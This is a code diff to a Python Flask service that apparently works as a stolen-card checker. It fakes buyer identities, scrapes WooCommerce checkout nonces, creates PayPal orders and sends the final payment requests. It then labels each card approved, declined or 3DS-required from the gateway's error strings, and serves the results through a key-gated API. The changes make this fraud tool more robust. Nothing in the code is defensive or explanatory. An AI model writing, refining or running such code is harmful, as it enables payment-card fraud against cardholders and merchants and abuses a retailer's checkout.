@@ -13,9 +13,12 @@ app = Flask(__name__)
 
 # --- Helper functions ---
 def generate_full_name():
-    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"]
-    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
+    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour",
+                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"]
+    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams",
+                  "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
     return random.choice(first_names), random.choice(last_names)
+
 
 def generate_address():
     cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
@@ -30,11 +33,14 @@ def generate_address():
         zip_codes[index],
     )
 
+
 def generate_random_account():
-    return ''.join(random.choices(string.ascii_lowercase, k=15)) + str(random.randint(1000,9999)) + "@gmail.com"
+    return ''.join(random.choices(string.ascii_lowercase, k=15)) + str(random.randint(1000, 9999)) + "@gmail.com"
+
 
 def generate_phone_number():
     return f"303{''.join(random.choices(string.digits, k=7))}"
+
 
 # --- Main checking logic ---
 def check_card(card_details):
@@ -69,7 +75,7 @@ def check_card(card_details):
             check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
             create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
         except AttributeError:
-            return {"message": "DECLINED ❌", "response_text": "ERROR: SCRAPE_FAILED"}
+            return {"message": "❌DECLINED", "response_text": "ERROR: SCRAPE_FAILED"}
 
         # 3. Create PayPal Order
         json_data_create = {
@@ -86,9 +92,14 @@ def check_card(card_details):
             headers={'user-agent': user},
             timeout=60
         )
-        order_data = response_create.json()
+        order_data = {}
+        try:
+            order_data = response_create.json()
+        except Exception:
+            return {"message": "❌DECLINED", "response_text": "ERROR: ORDER_JSON_FAILED"}
+
         if 'data' not in order_data or 'id' not in order_data['data']:
-            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_FAILED"}
+            return {"message": "❌DECLINED", "response_text": "ERROR: ORDER_FAILED"}
         paypal_id = order_data['data']['id']
 
         # 4. Final GraphQL payment request to PayPal
@@ -106,22 +117,32 @@ def check_card(card_details):
             timeout=60
         )
 
-        # Extract only the first error code
+        # Extract JSON safely
         try:
             raw_json = response_final.json()
+        except Exception:
+            raw_json = {}
+
+        # Check if 3DS required
+        if "is3DSecureRequired" in response_final.text:
+            return {"message": "3DS_REQUIRED", "response_text": "3DSecure step required"}
+
+        # Extract error code
+        error_text = "ERROR: UNKNOWN"
+        try:
             if "errors" in raw_json and len(raw_json["errors"]) > 0:
                 err = raw_json["errors"][0]
                 code = ""
                 if "data" in err and isinstance(err["data"], list) and len(err["data"]) > 0:
                     code = err["data"][0].get("code", "")
-                error_text = f"ERROR: {code}"
-            else:
-                error_text = "ERROR: UNKNOWN"
+                error_text = f"ERROR: {code}" if code else "ERROR: UNKNOWN"
         except Exception:
             error_text = "ERROR: PARSE_FAILED"
 
         # --- Decide clean message ---
-        if any(x in response_final.text for x in ["succeeded", "Thank You", "ADD_SHIPPING_ERROR", "is3DSecureRequired", "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED", "INVALID_BILLING_ADDRESS"]):
+        if any(x in response_final.text for x in ["succeeded", "Thank You", "ADD_SHIPPING_ERROR",
+                                                  "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED",
+                                                  "INVALID_BILLING_ADDRESS"]):
             return {"message": "✅APPROVED", "response_text": error_text}
         else:
             return {"message": "❌DECLINED", "response_text": error_text}
@@ -129,9 +150,13 @@ def check_card(card_details):
     except Exception as e:
         return {"message": "❌DECLINED", "response_text": f"ERROR: {str(e)}"}
 
+
 # --- API Endpoint ---
-@app.route('/gateway=<gateway>&key=<key>', methods=['GET'])
-def api_check(gateway, key):
+@app.route('/api', methods=['GET'])
+def api_check():
+    gateway = request.args.get('gateway')
+    key = request.args.get('key')
+
     # Key validation
     if key != "payalismy":
         return jsonify({"message": "ACCESS DENIED ❌", "response_text": "ERROR: INVALID_KEY"}), 403
@@ -145,6 +170,7 @@ def api_check(gateway, key):
 
     result = check_card(card_info)
     return jsonify(result)
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
